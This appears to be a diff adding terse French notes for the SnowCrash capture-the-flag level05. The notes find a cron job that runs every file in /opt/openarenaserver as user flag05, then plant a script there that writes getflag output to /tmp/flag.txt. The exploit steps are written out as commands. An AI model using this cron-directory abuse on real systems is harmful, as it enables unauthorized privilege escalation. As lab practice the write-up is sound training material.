@@ -1,0 +1,13 @@
+-mail recu et afficher avec cat /var/mail/level05.
+-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 -> une tache de cron qui s exec toutes les 2 minutes
+-level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+-script qui execute tous les fichiers avec les droits de flag05
+-faire un script qui getflag et l envoi dans un dossier ou level05 peut lire:
+echo -e "#\!/bin/sh\ngetflag > /tmp/flag.txt" > /opt/openarenaserver/script.sh
+-cat /tmp/flag.txt
